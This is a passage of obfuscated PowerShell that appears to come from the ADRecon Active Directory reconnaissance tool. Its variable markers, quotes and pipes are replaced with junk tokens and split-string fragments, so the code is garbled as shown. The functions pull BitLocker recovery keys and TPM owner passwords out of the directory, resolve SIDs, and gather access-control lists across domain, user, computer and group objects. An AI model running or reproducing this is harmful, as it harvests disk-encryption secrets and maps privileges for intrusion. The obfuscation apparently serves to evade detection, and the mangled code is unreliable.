            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            Return 5I7ELnull
        }
        5I7ELObjSearcher.dispose()

        If (5I7ELADBitLockerRecoveryKeys)
        {
            5I7ELcnt = 5I7EL([ADRecon.LDAPClass]::ObjectCount(5I7ELADBitLockerRecoveryKeys))
            If (5I7ELcnt -ge 1)
            {
                Write-Verbose I2aj[*] Total BitLocker Recovery Keys: 5I7ELcntI2aj
                5I7ELBitLockerObj = @()
                5I7ELADBitLockerRecoveryKeys Ok6rl ForEach-Object {
                    
                    5I7ELObj = New-Object PSObject
                    5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajDistinguished NameI2aj -Value 5I7EL(((5I7EL_.Properties.distinguishedname -split JQTOy}JQTOy)[1]).substring(1))
                    5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajNameI2aj -Value ([string] (5I7EL_.Properties.name))
                    5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I'+'2ajwhenCreatedI2aj -Value ([DateTime] 5I7EL(5I7'+'EL_.Properties.whencreated))
                    5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajRecovery Key IDI2aj -Value 5I7EL([GUID] 5I7EL_.Properties.JQTOymsfve-recoveryguidJQTOy[0])
                    5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajRecovery KeyI2aj -Value ([string] (5I7EL_.Properties.JQTOymsfve-recoverypasswordJQTOy))
                    5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajVolume GUIDI2aj -Value 5I7EL([GUID] 5I7EL_.Properties.JQTOymsfve-volumeguidJQTOy[0])

                    5I7ELobjSearcher = New-Object System.DirectoryServices.DirectorySearcher 5I7ELobjDomain
                    5I7ELObjSearcher.PageSize = 5I7ELPageSize
                    5I7ELObjSearcher.Filter = I2aj(&(samAccountType=805306369)(distinguishedName=5I7EL(5I7ELObj.JQTOyDistinguished NameJQTOy)))I2aj
                    5I7ELObjSearcher.PropertiesToLoad.AddRange((I2ajmstpm-ownerinformationI2aj,I2ajmstpm-tpminformationforcomputerI2aj))
                    5I7ELObjSearcher.SearchScope = I2ajSubtreeI2aj

                    Try
                    {
                        5I7ELTempComp = 5I7ELObjSearcher.FindAll()
                    }
                    Catch
                    {
                        Write-Warning I2aj[Get-ADRBitLocker] Error while enumerating 5I7EL(5I7ELObj.JQTOyDistinguished NameJQTOy) Computer ObjectI2aj
                        Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
                    }
                    5I7ELObjSearcher.dispose()

                    If (5I7ELTempComp)
                    {
                        
                        5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajmsTPM-OwnerInformationI2aj -Value 5I7EL([string] 5I7ELTempComp.Properties.JQTOymstpm-ownerinformationJQTOy)

                        
                        5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajmsTPM-TpmInformationForComputerI2aj -Value 5I7EL([string] 5I7ELTempComp.Properties.JQTOymstpm-tpminformationforcomputerJQTOy)
                        If (5I7ELnull -ne 5I7ELTempComp.Properties.JQTOymstpm-tpminformationforcomputerJQTOy)
                        {
                            
                            If (5I7ELCredential -ne [Management.Automation.PSCredential]::Empty)
                            {
                                5I7ELobjSearchPath = New-Object System.DirectoryServices.DirectoryEntry I2ajLDAP://5I7EL(5I7ELDomainController)/5I7EL(5I7ELTempComp.Properties.JQTOymstpm-tpminformationforcomputerJQTOy)I2aj, 5I7ELCredential.UserName,5I7ELCredential.GetNetworkCredential().Password
                                5I7ELobjSearcherPath = New-Object System.DirectoryServices.DirectorySearcher 5I7ELobjSearchPath
                                5I7ELobjSearcherPath.PropertiesToLoad.AddRange((I2ajmstpm-ownerinformationI2aj))
                                Try
                                {
                                    5I7ELTPMObject '+'= 5I7ELobjSearcherPath.FindAll()
                                }
                                Catch
                                {
                                    Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
                                }
                                5I7ELobjSearcherPath.dispose()

                                If (5I7ELTPMObject)
                                {
                                    5I7ELTPMRecoveryInfo = 5I7EL([string] 5I7ELTPMObject.Properties.JQTOymstpm-ownerinformationJQTOy)
                                }
                                Else
                                {
                                    5I7ELTPMRecoveryInfo = 5I7ELnull
                                }
            '+'                }
                            Else
                            {
                                Try
                                {
                                    5I7ELTPMObject = ([ADSI]I2ajLDAP://5I7EL(5I7ELTempComp.Properties.JQTOymstpm-tpminformationforcomputerJQTOy)I2aj)
                                }
                                Catch
                                {
                                    Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
                                }
                                If (5I7ELTPMObject)
                                {
                                    5I7ELTPMRecoveryInfo = 5I7EL([string] 5I7ELTPMObject.Properties.JQTOymstpm-ownerinformationJQTOy)
                                }
                                Else
                                {
                                    5I7ELTPMRecoveryInfo = 5I7ELnull
                                }
                            }
                        }
                    }
                    Else
                    {
                        5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajmsTPM-OwnerInformationI2aj -Value 5I7ELnull
                        5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajmsTPM-TpmInformationForComputerI2aj -Value 5I7ELnull
                        5I7ELTPMRecoveryInfo = 5I7ELnull
                    }
                    5I7ELObj Ok6rl Add-Member -MemberType NoteProperty -Name I2ajTPM Owner PasswordI2aj -Value 5I7ELTPMRecoveryInfo
                    5I7ELBitLockerObj += 5I7ELObj
                }
            }
            Remove-Variable cnt
            Remove-Variable'+' ADBitLockerRecoveryKeys
        }
    }

    If (5I7ELBitLockerObj)
    {
        Return 5I7ELBitLockerObj
    }
    Else
    {
        Return 5I7ELnull
    }
}


Function ConvertFrom-SID
{

    Param(
        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELMethod,

        [Parameter(Mandatory = 5I7ELtrue)]
        [Alias(JQTOySIDJQTOy)]
        
        [String]
        5I7ELObjectSid,

        [Parameter(Mandatory = 5I7ELfalse)]
        [string] 5I7ELDomainFQDN,

        [Parameter(Mandatory = 5I7ELfalse)]
        [Management.Automation.PSCredential] 5I7ELCredential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = 5I7ELfalse)]
        [bool] 5I7ELResolveSID = 5I7ELfalse
    )

    BEGIN {
        
        
        5I7ELADS_NAME_INITTYPE_DOMAIN   = 1 
        
        5I7ELADS_NAME_INITTYPE_GC       = 3 

        
        
        
        
        5I7ELADS_NAME_TYPE_NT4                      = 3 
        
        
        
        
        5I7ELADS_NAME_TYPE_UNKNOWN                  = 8 
        
        
        
        

        
        
        
        
        5I7ELADS_CHASE_REFERRALS_ALWAYS      = (0x60) 
    }

    PROCESS {
        5I7ELTargetSid = 5I7EL(5I7ELObjectSid.TrimStart(I2ajO:I2aj)'+')
        5I7ELTargetSid = 5I7EL(5I7ELTargetSid.Trim(JQTOy*JQTOy))
        If (5I7ELTargetSid -match JQTOy^S-1-.*JQTOy)
        {
            Try
            {
                
                Switch (5I7ELTargetSid) {
                    JQTOyS-1-0JQTOy         { JQTOyNull AuthorityJQTOy }
                    JQTOyS-1-0-0JQTOy       { JQTOyNobodyJQTOy }
                    JQTOyS-1-1JQTOy         { JQTOyWorld AuthorityJQTOy }
                    JQTOyS-1-1-0JQTOy       { JQTOyEveryo'+'neJQTOy }
                    JQTOyS-1-2JQTOy         { JQTOyLocal AuthorityJQTOy }
                    JQTOyS-1-2'+'-0JQTOy       { JQTOyLocalJQTOy }
                    JQTOyS-1-2-1JQTOy       { JQTOyConsole Logon JQTOy }
                    JQTOyS-1-3JQTOy         { JQTOyCreator AuthorityJQTOy }
                    JQTOyS-1-3-0JQTOy       { JQTOyCreator OwnerJQTOy }
                    JQTOyS-1-3-1JQTOy       { JQTOyCreator GroupJQTOy }
                    JQTOyS-1-3-2JQTOy       { JQTOyCreator Owner ServerJQTOy }
                    JQTOyS-1-3-3JQTOy       { JQTOyCreator Group ServerJQTOy }
                    JQTOyS-1-3-4JQTOy       { JQTOyOwner RightsJQTOy }
                    JQTOyS-1-4JQTOy         { JQTOyNon-unique AuthorityJQTOy }
                    JQTOyS-1-5JQTOy         { JQTOyNT AuthorityJQTOy }
                    JQTOyS-1-5-1JQTOy       { JQTOyDialupJQTOy }
                    JQTOyS-1-5-2JQTOy       { JQTOyNetworkJQTOy }
                    JQTOyS-1-5-3JQTOy       { JQTOyBatchJQTOy }
                    JQTOyS-1-5-4JQTOy       { JQTOyInteractiveJQTOy }
                    JQTOyS-1-5-6JQTOy       { JQTOyServiceJQTOy }
                    JQTOyS-1-5-7JQTOy       { JQTOyAnonymousJQTOy }
                    JQTOyS-1-5-8JQTOy       { JQTOyProxyJQTOy }
                    JQTOyS-1-5-9JQTOy       { JQTOyEnterprise Domain ControllersJQTOy }
                    JQTOyS-1-5-10JQTOy      { JQTOyPrincipal SelfJQTOy }
      '+'              JQTOyS-1-5-11JQTOy      { JQTOyAuthenticated UsersJQTOy }
                    JQTOyS-1-5-12JQTOy      { JQTOyRestricted CodeJQTOy }
                    JQTOyS-1-5-13JQTOy      { JQTOyTerminal Server UsersJQTOy }
                    JQTOyS-1-5-14JQTOy      { JQTOyRemote Interactive LogonJQTOy }
                    JQTOyS-1-5-15JQTOy      { JQTOyThis Organization JQTOy }
                    JQTOyS-1-5-17JQTOy      { JQTOyThis Organization JQTOy }
                    JQTOyS-1-5-18JQTOy      { JQTOyLocal SystemJQTOy }
                    JQTOyS-1-5-19JQTOy      { JQTOyNT AuthorityJQTOy }
                    JQTOyS-1-5-20JQTOy      { JQTOyNT AuthorityJQTOy }
                    JQTOyS-1-5-80-0JQTOy    { JQTOyAll Se'+'rvices JQTOy }
                    JQTOyS-1-5-32-544JQTOy  { JQTOyBUILTINCOlhgAdministratorsJQTOy }
                    JQTOyS-1-5-32-545JQTOy  { JQTOyBUILTINCO'+'lhgUsersJQTOy }
                    JQTOyS-1-5-32-546JQTOy  { JQTOyBUILTINCOlhgGuestsJQTOy }
                    JQTOyS-1-5-32-547JQTOy  { JQTOyBUILTINCOlhgPower U'+'sersJQTOy }
                    JQTOyS-1-5-32-548JQTOy  { JQTOyBUILTINCOlhgAccount OperatorsJQTOy }
                    JQTOyS-1-5-32-549JQTOy  { JQTOyBUILTINCOlhgServer OperatorsJQTOy }
                    JQTOyS-1-5-32-550JQTOy  { JQTOyBUILTINCOlhgPrint OperatorsJQTOy }
                    JQTOyS-1-5-32-551JQTOy  { JQTOyBUILTINCOlhgBackup OperatorsJQTOy }
                    JQTOyS-1-5-32-552JQTOy  { JQTOyBUILTINCOlhgReplicatorsJQTOy }
                    JQTOyS-1-5-32-554JQTOy  { JQTOyBUILTINCOlhgPre-Windows 2000 Compatible AccessJQTOy }
                    JQTOyS-1-5-32-555JQTOy  { JQTOyBUILTINCOlhgRemote Desktop UsersJQTOy }
                    JQTOyS-1-5-32-556JQTOy  { JQTOyBUILTINCOlhgNetwork Configuration OperatorsJQTOy }
                    JQTOyS-1-5-32-557JQTOy  { JQTOyBUILTINCOlhgIncoming Forest Trust BuildersJQTOy }
                    JQTOyS-1-5-32-558JQTOy  { JQTOyBUILTINCO'+'lhgPerformance Monitor UsersJQTOy }
                    JQTOyS-1-5-32-559JQTOy  { JQTOyBUILTINCOlhgPerformance Log UsersJQTOy }
                    JQTOyS-1-5-32-560JQTOy  { JQTOyBUILTINCOlhgWindows Authorization Access GroupJQTOy }
                    JQTOyS-1-5-32-561JQTOy  { JQTOyBUILTINCOlhgTerminal Server License ServersJQTOy }
                    JQTOyS-1-5-32-562JQTOy  { JQTOyBUILTINCOlhgDistributed COM UsersJQTOy }
                    JQTOyS-1-5-32-569JQTOy  { JQTOyBUILTINCOlhgCryptographic OperatorsJQTOy }
                    JQTOyS-1-5-32-573JQTOy  { JQTOyBUILTINCOlhgEvent Log ReadersJQTOy }
                    JQTOyS-1-5-32-574JQTOy  { JQTOyBUILTINCOlhgCertificate Service DCOM AccessJQTOy }
                    JQTOyS-1-5-32-575JQTOy  { JQTOyBUILTINCOlhgRDS Remote Access ServersJQTOy }
                    JQTOyS-1-5-32-576JQTOy  { JQTOyBUILTINCOlhgRDS Endpoint ServersJQTOy }
                    JQTOyS-1-5-32-577JQTOy  { JQTOyBUILTINCOlhgRDS Management ServersJQTOy }
                    JQTOyS-1-5-32-578JQTOy  { JQTOyBUILTINCOlhgHyper-V AdministratorsJQTOy }
                    JQTOyS-1-5-32-579JQTOy  { JQTOyBUILTINCOlhgAccess Control Assistance OperatorsJQTOy }
                    JQTOyS-1-5-32-580JQTOy  { JQTOyBUILTINCOlhgRemote Management UsersJQTOy }
                    Default {
                        
                        If ( (5I7ELTargetSid -match JQTOy^S-1-.*JQTOy) -and (5I7ELResolveSID) )
                        {
                            If (5I7ELMethod -eq JQTOyADWSJQTOy)
                            {
                                Try
                                {
                                    5I7ELADObject = Get-ADObject -Filter I2ajobjectSid -eq JQTOy5I7ELTargetSidJQTOyI2aj -Properties DistinguishedName,sAMAccountName
                                }
                                Catch
                                {
                                    Write-Warning I2aj[ConvertFrom-SID] Error while enumerating Object using SIDI2aj
                                    Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
                                }
                                If (5I7ELADObject)
                                {
                                    5I7ELUserDomain = Get-DNtoFQDN -ADObjectDN 5I7ELADObject.DistinguishedName
                                    5I7ELADSOutput = 5I7ELUserDomain + I2ajCOlhgI2aj + 5I7ELADObject.sAMAccountName
                                    Remove-Variable UserDomain
                                }
                            }

                            If (5I7ELMethod -eq JQTOyLDAPJQTOy)
                            {
                                If (5I7ELCredential -ne [Management.Automation.PSCredential]::Empty)
                                {
                                    5I7ELADObject = New-Object System.DirectoryServices.DirectoryEntry(I2ajLDAP://5I7ELDomainFQDN/<SID=5I7ELTargetSid>I2aj,(5I7ELCredential.GetNetworkCredential()).UserName,(5I7ELCredential.GetNetworkCredential()).Password)
                                }
                                Else
                                {
                                    5I7ELADObject = New-Object System.DirectoryServices.DirectoryEntry(I2ajLDAP://5I7ELDomainFQDN/<SID=5I7ELTargetSid>I2aj)
                                }
                                If (5I7ELADObject)
                             '+'   {
                                    If (-Not ([string]::IsNullOrEmpty(5I7ELADObject.Properties.samaccountname)) )
                                    {
                                        5I7ELUserDomain = Get-DNtoFQDN -ADObjectDN 5I7EL([string] (5I7ELADObject.Properties.distinguishedname))
                                        5I7ELADSOutput = 5I7ELUserDomain + I2ajCOlhgI2aj + 5I7EL([string] (5I7ELADObject.Properties.samaccountname))
                                        Remove-Variable UserDomain
                  '+'                  }
                                }
                            }

                            If ( (-Not 5I7ELADSOutput) -or ([string]::IsNullOrEmpty(5I7ELADSOutput)) )
                            {
                                5I7ELADSOutputType = 5I7ELADS_NAME_TYPE_NT4
                                5I7ELInit = 5I7ELtrue
                                5I7ELTranslate = New-Object -ComObject NameTranslate
                                If (5I7ELCredential -ne [Management.Automation.PSCredential]::Empty)
                                {
                                    5I7ELADSInitType = 5I7ELADS_NAME_INITTYPE_DOMAIN
                                    Try
                                    {
                                        [System.__ComObject].InvokeMember(I2ajInitExI2aj,I2ajInvokeMethodI2aj,5I7ELnull,5I7ELTranslate,5I7EL(@(5I7ELADSInitType,5I7ELDomainFQDN,(5I7ELCredential.GetNetworkCredential()).UserName,5I7ELDomainFQDN,(5I7ELCredential.GetNetworkCredential()).Password)))
                                    }
                                    Catch
                                    {
                                        5I7ELInit = 5I7ELfalse
                                        
                                        
                                    }
                                }
                     '+'           Else
                                {
                                    5I7ELADSInitType = 5I7E'+'LADS_NAME_INITTYPE_GC
                                    Try
                                    {
                                        [System.__ComObject].InvokeMember(I2ajInitI2aj,I2ajInvokeMethodI2aj,5I7ELnull,5I7ELTranslate,(5I7ELADSInitType,5I7ELnull))
                                    }
                                    Catch
                                    {
                                        5I7ELInit = 5I7ELfalse
                                        
                                        
                                    }
                                }
                                If (5I7ELInit)
                                {
                                    [System.__ComObject].InvokeMember(I2ajChaseReferralI2aj,I2ajSetPropertyI2aj,5I7ELnull,5I7ELTranslate,5I7ELADS_CHASE_REFERRALS_ALWAYS)
                                    Try
                                    {
                                        [System.__ComObject].InvokeMember(I2ajSetI2aj,I2ajInvokeMethodI2aj,5I7ELnull,5I7ELTranslate,(5I7ELADS_NAME_TYPE_UNKNOWN, 5I7ELTargetSID))
                                        5I7ELADSOutput = [System.__ComObject].InvokeMember(I2ajGetI2aj,I2ajInvoke'+'MethodI2aj,5I7ELnull,5I7ELTranslate,5I7ELADSOutputType)
                                    }
                                    Catch
                                    {
                                        
                                        
                                    }
                                }
                            }
                        }
                        If (-Not ([string]::IsNullOrEmpty(5I7ELADSOutput)) )
                        {
                            Return 5I7ELADSOutput
                        }
                        Else
                        {
                            Return 5I7ELTargetSid
                        }
                    }
                }
            }
            Catch
            {
                
                
            }
        }
        Else
        {
            Return 5I7ELTargetSid
        }
    }
}


Function Get-ADRACL
{

    param(
        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELMethod,

        [Parameter(Mandatory = 5I7ELfalse)]
        [DirectoryServices.DirectoryEntry] 5I7ELobjDomain,

        [Parameter(Mandatory = 5I7ELfalse)]
        [string] 5I7ELDomainController,

        [Parameter(Mandatory = 5I7ELfalse)]
        [Management.Automation.PSCredential] 5I7ELCredential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = 5I7ELfalse)]
        [bool] 5I7ELResolveSID = 5I7ELfalse,

        [Parameter(Mandatory = 5I7ELtrue)]
        [int] 5I7ELPageSize,

        [Parameter(Mandatory = 5I7ELfalse)]
        [int] 5I7ELThreads = 10
    )

    If (5I7ELMethod -eq JQTOyADWSJQTOy)
    {
        If (5I7ELCredential -eq [Management.Automation.PSCredential]::Empty)
        {
            If (Test-Path AD:)
            {
                Set-Location AD:
            }
            Else
            {
                Write-Warning I2ajDefault AD drive not found ... Skipping ACL enumerationI2aj
                Return 5I7ELnull
            }
        }
        5I7ELGUIDs = @{JQTOy00000000-0000-0000-0000-000000000000JQTOy = JQTOyAllJQTOy}
        Try
        {
            Write-Verbose I2aj[*] Enumerating schemaIDsI2aj
            5I7ELschemaIDs = Get-ADObject -SearchBase (Get-ADRootDSE).schemaNamingContext -LDAPFilter JQTOy(schemaIDGUID=*)JQTOy -Properties name, schemaIDGUID
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRACL] Error while enumerating schemaIDsI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
        }

        If (5I7ELschemaIDs)
        {
            5I7ELschemaIDs Ok6rl Where-Object {5I7EL_} Ok6rl ForEach-Object {
                
                5I7ELGUIDs[(New-Object Guid (,5I7EL_.schemaIDGUID)).Guid] = 5I7EL_.name
            }
            Remove-Variable schemaIDs
        }

        Try
        {
            Write-Verbose I2aj[*] Enumerating Active Directory RightsI2aj
            5I7ELschemaIDs = Get-ADObject -SearchBase I2ajCN=Extended-Rights,5I7EL((Get-ADRootDSE).'+'configurationNamingContext)I2aj -LDAPFilter JQTOy(objectClass=controlAccessRight)JQTOy -Properties name, rightsGUID
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRACL] Error while enumerating Active Directory RightsI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
        }

        If (5I7ELschemaIDs)
        {
            5I7ELschemaIDs Ok6rl Where-Object {5I7EL_} Ok6rl ForEach-Object {
                
                5I7ELGUIDs[(New-Object Guid (,5I7EL_.rightsGUID)).Guid] = 5I7EL_.name
            }
            Remove-Variable schemaIDs
        }

        
        5I7ELObjs = @()
        Try
        {
            5I7ELADDomain = Get-ADDomain
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRACL] Error getting Domain ContextI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
        }

        Try
        {
            Write-Verbose I2aj[*] Enumerating Domain, OU, GPO, User, Computer and Group ObjectsI2aj
            5I7ELObjs += Get-ADObject -LDAPFilter JQTOy(Ok6rl(objectClass=domain)(objectCategory=organizationalunit)(objectCategory=groupPolicyContainer)(samAccountType=805306368)(samAccountType=805306369)(samaccounttype=268435456)(samaccounttype=268435457)(samaccounttype=536870912)(samaccounttype=536870913))JQTOy -Properties DisplayName, DistinguishedName, Name, ntsecuritydescriptor, ObjectClass, objectsid
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRACL] Error while enumerating Domain, OU, GPO, User, Computer and Group ObjectsI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
        }

        If (5I7ELADDomain)
        {
            Try
            {
                Write-Verbose I2aj[*] Enumerating Root Container ObjectsI2aj
                5I7ELObjs += Get-ADObject -SearchBase 5I7EL(5I7ELADDomain.DistinguishedName) -SearchScope OneLevel -LDAPFilter JQTOy(objectClass=container)JQTOy -Properties DistinguishedName, Name, ntsecuritydescriptor, ObjectClass
            }
            Catch
            {
                Write-Warning I2aj[Get-ADRACL] Error while enumerating Root Container ObjectsI2aj
                Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            }
        }

        If (5I7ELObjs)
        {
            5I7ELACLObj = @()
            Write-Verbose I2aj[*] Total Objects: 5I7EL([ADRecon.ADWSClass]::ObjectCount(5I7ELObjs))I2aj
            Write-Verbose I2aj[-] DACLsI2aj
            5I7ELDACLObj = [ADRecon.ADWSClass]::DACLParser(5I7ELObjs, 5I7ELGUIDs, 5I7ELThreads)
            
            Write-Warning I2aj[*] SACLs -'+' Currently, the module is only supported with LDAP.I2aj
            
            Remove-Variable Objs
            Remove-Variable GUIDs
        }
    }

    If (5I7ELMethod -eq JQTOyLDAPJQTOy)
    {
        5I7ELGUIDs = @{JQTOy00000000-0000-0000-0000-000000000000JQTOy = JQTOyAllJQTOy}

        If (5I7ELCredential -ne [Management.Automation.PSCredential]::Empty)
        {
            5I7ELDomainFQDN = Get-DNtoFQDN(5I7ELobjDomain.distinguishedName)
            5I7ELDomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(I2ajDomainI2aj,5I7EL(5I7ELDomainFQDN),5I7EL(5I7ELCredential.UserName),5I7EL(5I7ELCredential.G'+'etNetworkCredential().password))
            Try
            {
                5I7ELADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain(5I7ELDomainContext)
            }
            Catch
            {
                Write-Warning I2aj[Get-ADRACL] Error getting Domain ContextI2aj
                Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            }

            Try
            {
                5I7ELForestC'+'ontext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(I2ajForestI2aj,5I7EL(5I7ELADDomain.Forest),5I7EL(5I7ELCredential.UserName),5I7EL(5I7ELCredential.GetNetworkCre'+'dential().password))
                5I7ELADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest(5I7ELForestContext)
                5I7ELSchemaPath = 5I7ELADForest.Schema.'+'Name
                Remove-Variable ADForest
            }
            Catch
            {
                Write-Warning I2aj[Get-ADRACL] Error enumerating SchemaPathI2aj
                Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            }
        }
        Else
        {
            5I7ELADDomain = [Syste'+'m.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            5I7ELADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
            5I7ELSchemaPath = 5I7ELADForest.Schema.Name
            Remove-Variable ADForest
        }

        If (5I7ELSchemaPath)
        {
            Write-Verbose I2aj[*] Enumerating schemaIDsI2aj
            If (5I7ELCredential -ne [Management.Automation.PSCredential]::Empty)
            {
                5I7ELobjSearchPath = New-Object System.DirectoryServices.DirectoryEntry I2ajLDAP://5I7EL(5I7ELDomainController)/5I7EL(5I7ELSchemaPath)I2aj, 5I7ELCredential.UserName,5I7ELCredential.GetNetworkCredential().Password
                5I7ELobjSearcherPath = New-Object System.DirectoryServices.DirectorySearcher 5I7ELobjSearchPath
            }
            Else
            {
                5I7ELobjSearcherPath = New-Object System.DirectoryServices.DirectorySearcher ([ADSI] I2ajLDAP://5I7EL(5I7ELSchemaPath)I2aj)
            }
            5I7ELobjSearcherPath.PageSize = 5I7ELPageSize
            5I7ELobjSearcherPath.filter = I2aj(schemaIDGUID=*)I2aj

            Try
            {
                5I7ELSchemaSearcher = 5I7ELobjSearcherPath.FindAll()
            }
            Catch
            {
                Write-Warning I2aj[Get-ADRACL] Error enumerating SchemaIDsI2aj
                Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            }

            If (5I7ELSchemaSearcher)
            {
                5I7ELSchemaSearcher Ok6rl Where-Object {5I7EL_} Ok6rl ForEach-Object {
                    
                    5I7ELGUIDs[(New-Object Guid (,5I7EL_.properties.schemaidguid[0])).Guid] = 5I7EL_.properties.name[0]
                }
                5I7ELSchemaSearcher.dispose()
            }
            5I7ELobjSearcherPath.dispose()

            Write-Verbose I2aj[*] Enumerating Active Directory RightsI2aj
            If (5I7ELCredential -ne [Management.Automation.PSCredential]::Empty)
            {
                5I7ELobjSearchPath = New-Object System.DirectoryServices.DirectoryEntry I2ajLDAP://5I7EL(5I7ELDomainController)/5I7EL(5I7ELSchemaPath.replace(I2ajSchemaI2aj,I2ajExtended-RightsI2aj))I2aj, 5I7ELCredential.UserName,5I7ELCredential.GetNetworkCredential().Password
                5I7ELobjSearcherPath = New-Object System.DirectoryServices.DirectorySearcher 5I7ELobjSearchPath
            }
            Else
            {
                5I7ELobjSearcherPath = New-Object System.DirectoryServices.DirectorySearcher ([ADSI] I2ajLDAP://5I7EL(5I7ELSchemaPath.replace(I2ajSchemaI2aj,I2ajExtended-RightsI2aj))I2aj)
            }
            5I7ELobjSearcherPath.PageSize = 5I7ELPageSize
            5I7ELobjSearcherPath.filter = I2aj(objectClass=controlAccessRight)I2aj

            Try
            {
                5I7ELRightsSearcher = 5I7ELobjSearcherPath.FindAll()
            }
            Catch
            {
                Write-Warning I2aj[Get-ADRACL] Error enumerating Active Directory RightsI2aj
                Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
            }

            If (5I7ELRightsSearcher)
            {
                5I7ELRightsSearcher Ok6rl Where-Object {5I7EL_} Ok6rl ForEach-Object {
                    
                    5I7ELGUIDs[5I7EL_.properties.rightsguid[0].toString()] = 5I7EL_.properties.name[0]
                }
                5I7ELRightsSearcher.dispose()
            }
            5I7ELobjSearcherPath.dispose()
        }

        
        5I7ELObjs = @()
        Write-Verbose I2aj[*] Enumerating Domain, OU, GPO, User, Computer and Group ObjectsI2aj
        5I7ELobjSearcher = New-Object System.DirectoryServices.DirectorySearcher 5I7ELobjDomain
        5I7ELObjSearcher.PageSize = 5I7ELPageSize
        5I7ELObjSearcher.Filter = I2aj(Ok6rl(objectClass=domain)(objectCategory=organizationalunit)(objectCategory=groupPolicyContainer)(samAccountType=805306368)(samAccountType=805306369)(samaccounttype=268435456)(samaccounttype=268435457)(samaccounttype=536870912)(samaccounttype=536870913))I2aj
        
        5I7ELObjSearcher.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl -bor [System.DirectoryServices.SecurityMasks]::Group -bor [System.DirectoryServices.SecurityMasks]::Owner -bor [System.DirectoryServices.S'+'ecurityMasks]::Sacl
        5I7ELObjSearcher.PropertiesToLoad.AddRange((I2ajdisplaynameI2aj,I2ajdistinguishednameI2aj,I2ajnameI2aj,I2ajntsecuritydescriptorI2aj,I2ajobjectclassI2aj,I2ajobjectsidI2aj))
        5I7ELObjSearcher.SearchScope = I2ajSubtreeI2aj

        Try
        {
            5I7ELObjs += 5I7ELObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRACL] Error while enumerating Domain, OU, GPO, User, Computer and Group ObjectsI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
        }
        5I7ELObjSearcher.dispose()

        Write-Verbose I2aj[*] Enumerating Root Container ObjectsI2aj
        5I7ELobjSearcher = New-Object System.DirectoryServices.DirectorySearcher 5I7ELobjDomain
        5I7ELObjSearcher.PageSize = 5I7ELPageSize
        5I7ELObjSearcher.Filter = I2aj(objectClass=container)I2aj
        
        5I7ELObjSearcher.SecurityMasks = 5I7ELObjSearcher.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl -bor [System.DirectoryServices.SecurityMasks]::Group -bor [System.DirectoryServices.SecurityMasks]::Owner -bor [System.DirectoryServices.SecurityMasks]::Sacl
        5I7ELObjSearcher.PropertiesToLoad.AddRange((I2ajdistinguishednameI2aj,I2ajnameI2aj,I2ajntsecuritydescriptorI2aj,I2ajobjectclassI2aj))
        5I7ELObjSearcher.SearchScope = I2ajOneLevelI2aj

        Try
        {
            5I7ELObjs += 5I7ELObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning I2aj[Get-ADRACL] Error while enumerating Root Container ObjectsI2aj
            Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
        }
        5I7ELObjSearcher.dispose()

        If (5I7ELObjs)
        {
            Write-Verbose I2aj[*] Total Objects: 5I7EL([ADRecon.LDAPClass]::ObjectCount(5I7ELObjs))I2aj
            Write-Verbose I2aj[-] DACLsI2aj
            5I7ELDACLObj = [ADRecon.LDAPClass]::DACLParser(5I7ELObjs, 5I7ELGUIDs, 5I7ELThreads)
            Write-Verbose I2aj[-] SACLs - May need a Privileged AccountI2aj
            5I7ELSACLObj = [ADRecon.LDAPClass]::SACLParser(5I7ELObjs, 5I7ELGUIDs, 5I7ELThreads)
            Remove-Variable Objs
            Remove-Variable GUIDs
        }
